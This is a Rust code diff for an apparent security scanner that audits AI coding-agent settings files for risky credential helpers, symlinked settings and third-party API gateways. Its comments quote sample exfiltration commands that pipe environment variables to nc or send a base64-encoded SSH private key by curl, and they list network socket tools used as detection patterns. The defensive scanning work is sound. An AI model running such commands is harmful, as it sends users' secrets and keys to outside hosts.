@@ -121,10 +121,11 @@ pub const HELPER_KEYS: &[&str] = &[
     "otelHeadersHelper",
 ];
 
-/// Dangerous-pattern descriptions a credential helper legitimately matches: it reads a
-/// key, prints an environment variable, or base64-decodes a stored secret. These do not
-/// make a helper dangerous on their own; a fetch piped to a shell, an exfiltration pipe,
-/// a listener, `eval(`, `--no-verify` or any obfuscated match still do.
+/// Dangerous-pattern descriptions a single-stage credential helper legitimately matches:
+/// it reads a key, prints an environment variable (`echo $ANTHROPIC_API_KEY`,
+/// `printenv KEY`), or base64-decodes a stored secret (`base64 -d < ~/.key`). These do
+/// not make a helper dangerous on their own; a fetch piped to a shell, a listener,
+/// `eval(`, `--no-verify` or any obfuscated match still do.
 const HELPER_EXPECTED: &[&str] = &[
     "credential access",
     "environment variable exfiltration",
@@ -134,11 +135,22 @@ const HELPER_EXPECTED: &[&str] = &[
 ];
 
 /// True when a helper command matches a dangerous pattern beyond what a credential
-/// helper normally does (see HELPER_EXPECTED).
+/// helper normally does (see HELPER_EXPECTED). The exemption covers single-stage shapes
+/// only: a helper prints a credential, it never sends local data anywhere, so a match
+/// whose data is piped or substituted into a network sender (`printenv | nc host 443`,
+/// `curl https://x/$(cat ~/.ssh/id_rsa | base64)`; see
+/// [`crate::scanners::skills::feeds_network_sender`]) is dangerous, and so is anything
+/// piped into a raw socket (nc, socat, telnet, `/dev/tcp`) and a python/node/ruby
+/// one-liner whose HTTP request carries the environment or a file it reads, from every
+/// scope. A fetch whose own arguments carry a token (`curl -H "X-Vault-Token: $(cat
+/// ~/.vault-token)" https://vault/...`) matches no pattern and stays a normal helper.
 pub fn helper_dangerous(cmd: &str) -> bool {
-    crate::scanners::rules_files::check_dangerous_patterns(cmd).iter().any(|f| {
-        f.pattern.contains("(obfuscated") || !HELPER_EXPECTED.iter().any(|e| f.pattern.starts_with(e))
-    })
+    use crate::scanners::skills::{feeds_network_sender, pipes_into_socket, script_sends_local_data};
+    let hits = crate::scanners::rules_files::check_dangerous_patterns(cmd);
+    if pipes_into_socket(cmd) || script_sends_local_data(cmd) || (!hits.is_empty() && feeds_network_sender(cmd)) {
+        return true;
+    }
+    hits.iter().any(|f| f.pattern.contains("(obfuscated") || !HELPER_EXPECTED.iter().any(|e| f.pattern.starts_with(e)))
 }
 
 /// Credential/telemetry helpers in a settings object, recorded like hooks (redacted).
@@ -190,11 +202,87 @@ pub fn extract_login_gateway(json: &serde_json::Value, source: &str) -> Option<c
         None => (None, None),
     };
     Some(crate::models::LoginGateway {
-        method: method.map(|m| crate::scanners::sanitize_display(m, 32)),
+        // Only the documented values (settings-reference: `claudeai`, `console`) are shown;
+        // any other text is `<other>`, never echoed.
+        method: method.map(|m| if matches!(m, "claudeai" | "console") { m.to_string() } else { "<other>".to_string() }),
         host,
         scheme,
         effective: matches!(source, "user-global" | "managed"),
     })
+}
+
+/// What opening a settings file produced.
+enum SettingsRead {
+    Content(String),
+    /// A project file that is (or sits under) a symlink leaving the repository: not read.
+    Link(crate::models::EnvSymlink),
+    Unreadable,
+}
+
+/// Project and local scopes are repository content; user-global, user-local and
+/// managed files are the user's or the organization's own (a dotfiles-managed
+/// ~/.claude/settings.json is a normal link).
+fn is_repository_scope(source: &str) -> bool {
+    matches!(source, "project" | "local")
+}
+
+/// Open a settings file. A user or managed file is read as it is. A project or local
+/// file (`<proj>/.claude/settings.json`, `settings.local.json`, `<proj>/.cursor/hooks.json`,
+/// `cli.json`) is repository content and is read the way a `.env` is: a symlink at the
+/// file is inventoried by its lexical target (flagged when that is a credential, key or
+/// agent-config path) and never opened, and a symlinked agent directory (`.claude ->
+/// elsewhere`) is followed only while the real path stays inside the project's
+/// repository. The open itself refuses a link at the final component (O_NOFOLLOW) and a
+/// FIFO, and the opened descriptor must be the resolved path, so a swap is refused too.
+fn read_settings(path: &Path, source: &str) -> SettingsRead {
+    use crate::scanners::persistence::{is_sensitive_read_target, lexical_join};
+    if !is_repository_scope(source) {
+        return read_bounded(path).map_or(SettingsRead::Unreadable, SettingsRead::Content);
+    }
+    let home = std::env::var_os("HOME").map(PathBuf::from).unwrap_or_default();
+    let real_home = std::fs::canonicalize(&home).unwrap_or_else(|_| home.clone());
+    let is_link = |p: &Path| std::fs::symlink_metadata(p).is_ok_and(|m| m.file_type().is_symlink());
+    let agent_dir = path.parent().unwrap_or(Path::new("."));
+    let project_dir = agent_dir.parent().unwrap_or(agent_dir);
+    let shown = |t: &Path| crate::scanners::sanitize_display(&t.to_string_lossy(), 300);
+    if is_link(path) {
+        let target = std::fs::read_link(path).unwrap_or_default();
+        let lexical = lexical_join(agent_dir, &target);
+        return SettingsRead::Link(crate::models::EnvSymlink {
+            target: shown(&target),
+            sensitive_target: is_sensitive_read_target(&lexical, &home),
+        });
+    }
+    let Ok(real) = std::fs::canonicalize(path) else { return SettingsRead::Unreadable };
+    let root = crate::scanners::skills::project_containment_root(project_dir, &home);
+    let real_root = std::fs::canonicalize(&root).unwrap_or(root);
+    if !real.starts_with(&real_root) {
+        let name = path.file_name().unwrap_or_default();
+        let (text, lexical) = if is_link(agent_dir) {
+            let t = std::fs::read_link(agent_dir).unwrap_or_default();
+            (t.join(name), lexical_join(project_dir, &t).join(name))
+        } else {
+            (real.clone(), real.clone())
+        };
+        return SettingsRead::Link(crate::models::EnvSymlink {
+            target: shown(&text),
+            sensitive_target: is_sensitive_read_target(&lexical, &home) || is_sensitive_read_target(&real, &real_home),
+        });
+    }
+    crate::scanners::read_bounded_nofollow(path, Some(&real)).map_or(SettingsRead::Unreadable, SettingsRead::Content)
+}
+
+/// The inventory entry for a project settings file that was not opened because it is a
+/// symlink out of its repository.
+fn linked_settings(path: &Path, source: &str, framework: &str, link: crate::models::EnvSymlink) -> AgentSettings {
+    AgentSettings {
+        path: crate::scanners::sanitize_display(&path.to_string_lossy(), 512),
+        source: source.to_string(),
+        framework: framework.to_string(),
+        git_tracked: is_git_tracked(path),
+        symlink: Some(link),
+        ..Default::default()
+    }
 }
 
 /// Parse one Claude Code settings file. None when it is absent or not JSON.
@@ -202,7 +290,11 @@ pub fn parse_settings_file(path: &Path, source: &str, framework: &str) -> Option
     if !crate::scanners::probe_file(path) {
         return None;
     }
-    let content = read_bounded(path)?;
+    let content = match read_settings(path, source) {
+        SettingsRead::Content(c) => c,
+        SettingsRead::Link(l) => return Some(linked_settings(path, source, framework, l)),
+        SettingsRead::Unreadable => return None,
+    };
     let json = serde_json::from_str::<serde_json::Value>(&content).ok()?;
 
     let hooks = extract_hooks(&json, path);
@@ -263,6 +355,7 @@ pub fn parse_settings_file(path: &Path, source: &str, framework: &str) -> Option
             .get("disableSkillShellExecution")
             .and_then(|v| v.as_bool())
             .unwrap_or(false),
+        symlink: None,
     })
 }
 
@@ -304,10 +397,17 @@ pub fn extract_cursor_hooks(json: &serde_json::Value, settings_path: &Path) -> V
 /// into the shared AgentSettings shape, so every downstream consumer — findings, --diff
 /// drift, Blueprint assets — covers Cursor without special-casing.
 fn parse_cursor_settings(path: &Path, source: &str, out: &mut Vec<AgentSettings>) {
-    if !crate::scanners::probe_file(&path) {
+    if !crate::scanners::probe_file(path) {
         return;
     }
-    let Some(content) = read_bounded(path) else { return };
+    let content = match read_settings(path, source) {
+        SettingsRead::Content(c) => c,
+        SettingsRead::Link(l) => {
+            out.push(linked_settings(path, source, "cursor", l));
+            return;
+        }
+        SettingsRead::Unreadable => return,
+    };
     let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) else {
         return;
     };
@@ -363,6 +463,7 @@ fn parse_cursor_settings(path: &Path, source: &str, out: &mut Vec<AgentSettings>
         helper_commands: Vec::new(),
         login_gateway: None,
         disable_skill_shell_execution: false,
+        symlink: None,
     });
 }
 
@@ -398,17 +499,21 @@ pub fn extract_gateway_overrides(json: &serde_json::Value) -> Vec<crate::models:
     out
 }
 
-/// Classify one base-URL assignment against GATEWAY_VARS: None when `var` is not a
-/// known gateway variable. Shared by the settings `env` block and project `.env` files
-/// so both decide "official" identically (exact host match).
+/// Classify one base-URL assignment: None when `var` is not a known gateway variable.
+/// Shared by the settings `env` block and project `.env` files so both decide "official"
+/// identically.
+///
+/// One model for every base-URL variable: a host that is some AI provider's own API
+/// ([`is_first_party_api_host`]) is official whichever variable names it. A key sent to a
+/// provider's own API goes to that provider and nowhere else, so cross-provider routing to
+/// a first-party host (`OPENAI_BASE_URL=https://api.anthropic.com/v1/`, Anthropic's
+/// OpenAI-SDK-compatible endpoint; `ANTHROPIC_BASE_URL=https://api.deepseek.com/anthropic`,
+/// DeepSeek's Anthropic-compatible one) is never a gateway finding (informational at
+/// most, and not reported). Every other host is a third party until a human says so.
 pub fn classify_base_url(var: &str, value: &str) -> Option<crate::models::GatewayOverride> {
     GATEWAY_VARS.iter().find(|(v, _)| *v == var)?;
     let host = url_host(value);
-    // Any provider's own API host is first-party for any base-URL variable: Anthropic
-    // documents api.anthropic.com/v1/ as an OpenAI-SDK-compatible endpoint, and a key
-    // sent to the provider that issued it goes nowhere new.
-    let official = GATEWAY_VARS.iter().any(|(_, h)| host.eq_ignore_ascii_case(h))
-        || (var.starts_with("OPENAI_") && is_openai_compatible_provider(&host));
+    let official = is_first_party_api_host(&host);
     // The host is attacker-chosen text in a project settings file (ESC, OSC, newlines),
     // and a credential pasted into a base-URL variable must not be echoed: shown only
     // when it reads as a host (redacted and sanitized), after the official comparison
@@ -417,13 +522,29 @@ pub fn classify_base_url(var: &str, value: &str) -> Option<crate::models::Gatewa
     Some(crate::models::GatewayOverride { var: var.to_string(), official, host })
 }
 
-/// First-party providers whose documented API is OpenAI-compatible, so an OPENAI_BASE_URL
-/// pointing at them is the provider's own endpoint, not a third-party gateway: Groq
+/// An AI provider's own API host: the official hosts of [`GATEWAY_VARS`], OpenAI's
+/// regional data-residency hosts (`<region>.api.openai.com`, exactly one alphanumeric
+/// label, the same shape as the Azure resource rule;
+/// developers.openai.com/api/docs/guides/your-data gives `https://eu.api.openai.com/v1`),
+/// and the providers of [`is_openai_compatible_provider`].
+pub fn is_first_party_api_host(host: &str) -> bool {
+    let h = host.trim_end_matches('.').to_ascii_lowercase();
+    let openai_region = h
+        .strip_suffix(".api.openai.com")
+        .is_some_and(|label| !label.is_empty() && label.bytes().all(|b| b.is_ascii_alphanumeric()));
+    GATEWAY_VARS.iter().any(|(_, o)| h == *o) || openai_region || is_openai_compatible_provider(&h)
+}
+
+/// First-party providers that run their own OpenAI- or Anthropic-compatible API, so a base
+/// URL pointing at them is the provider's own endpoint, not a third-party gateway: Groq
 /// (api.groq.com/openai/v1), Mistral, Google Gemini (generativelanguage.googleapis.com
-/// /v1beta/openai), Together, DeepSeek, Fireworks, xAI, OpenRouter, Perplexity, NVIDIA NIM
-/// (integrate.api.nvidia.com/v1), Cerebras, SambaNova, Hugging Face Inference Providers
-/// (router.huggingface.co/v1), Cloudflare Workers AI (api.cloudflare.com/client/v4/
-/// accounts/<id>/ai/v1), Azure OpenAI and Azure AI Foundry resources
+/// /v1beta/openai), Together, DeepSeek (also api.deepseek.com/anthropic for Claude Code),
+/// Fireworks, xAI, OpenRouter, Perplexity, NVIDIA NIM (integrate.api.nvidia.com/v1),
+/// Cerebras, SambaNova, Hugging Face Inference Providers (router.huggingface.co/v1),
+/// Cloudflare Workers AI (api.cloudflare.com/client/v4/accounts/<id>/ai/v1), Z.ai / Zhipu
+/// GLM (api.z.ai/api/anthropic, open.bigmodel.cn/api/anthropic), Moonshot Kimi
+/// (api.moonshot.ai/anthropic, api.moonshot.cn/anthropic), MiniMax
+/// (api.minimax.io/anthropic), Azure OpenAI and Azure AI Foundry resources
 /// (`<resource>.openai.azure.com`, `<resource>.cognitiveservices.azure.com`,
 /// `<resource>.services.ai.azure.com`), Vertex AI (`<region>-aiplatform.googleapis.com`)
 /// and Amazon Bedrock (`bedrock-runtime.<region>.amazonaws.com/openai/v1`).
@@ -431,7 +552,8 @@ const OPENAI_COMPATIBLE_HOSTS: &[&str] = &[
     "api.groq.com", "api.mistral.ai", "generativelanguage.googleapis.com", "api.together.xyz",
     "api.deepseek.com", "api.fireworks.ai", "api.x.ai", "openrouter.ai", "api.perplexity.ai",
     "integrate.api.nvidia.com", "api.cerebras.ai", "api.sambanova.ai", "router.huggingface.co",
-    "api.cloudflare.com", "aiplatform.googleapis.com",
+    "api.cloudflare.com", "aiplatform.googleapis.com", "api.z.ai", "open.bigmodel.cn",
+    "api.moonshot.ai", "api.moonshot.cn", "api.minimax.io",
 ];
 const OPENAI_COMPATIBLE_SUFFIXES: &[&str] = &[
     ".openai.azure.com",
@@ -463,9 +585,8 @@ pub fn is_openai_compatible_provider(host: &str) -> bool {
 /// actually dials, so the official-vs-hostile decision can't be spoofed. Delegates the
 /// evasion-resistant authority parse to [`crate::scanners::split_url_authority`].
 fn url_host(url: &str) -> String {
-    let (_scheme, host_port) = crate::scanners::split_url_authority(url);
-    let host = host_port.split(':').next().unwrap_or(host_port);
-    host.trim().to_ascii_lowercase()
+    // host_of, not a split on the first ':': `http://[::]:4000` is `::`, not `[`.
+    crate::scanners::host_of(url).0.trim().to_string()
 }
 
 /// Agent-config directories a hook command might reference. A hook that runs a script
@@ -576,6 +697,12 @@ fn program_tokens(command: &str) -> Vec<&str> {
     out
 }
 
+/// Shells and script interpreters: a command that starts one runs a script.
+const INTERPRETER_PROGRAMS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python2", "python3", "node", "deno", "bun", "ruby", "perl",
+    "php", "pwsh", "osascript",
+];
+
 #[cfg(unix)]
 fn has_exec_bit(p: &Path) -> bool {
     use std::os::unix::fs::PermissionsExt;
@@ -673,7 +800,19 @@ fn classify_command(
             }
             v
         };
-        if probe && candidates.iter().any(|c| (!program_only || has_exec_bit(c)) && is_native_binary(c)) {
+        // A shell or interpreter (`/bin/bash ~/bin/key.sh`, `/usr/bin/python3 x.py`) is
+        // native by nature and runs a script: not a risk. A credential helper launching
+        // an installed CLI (`/usr/bin/op read ...`, `/usr/local/bin/vault`) is the normal
+        // shape, so for helpers only a binary shipped inside the project is noted.
+        let interpreter = INTERPRETER_PROGRAMS.contains(&token.rsplit('/').next().unwrap_or(token));
+        // (~/.claude/settings.json's "project root" is HOME, which ships nothing.)
+        let shipped = |c: &Path| project_root.is_some_and(|r| c.starts_with(r) && home.is_none_or(|h| r != h));
+        if probe
+            && !interpreter
+            && candidates
+                .iter()
+                .any(|c| (!program_only || (has_exec_bit(c) && shipped(c))) && is_native_binary(c))
+        {
             risks.push(format!("executes a native binary, not a script ({token})"));
         }
     }
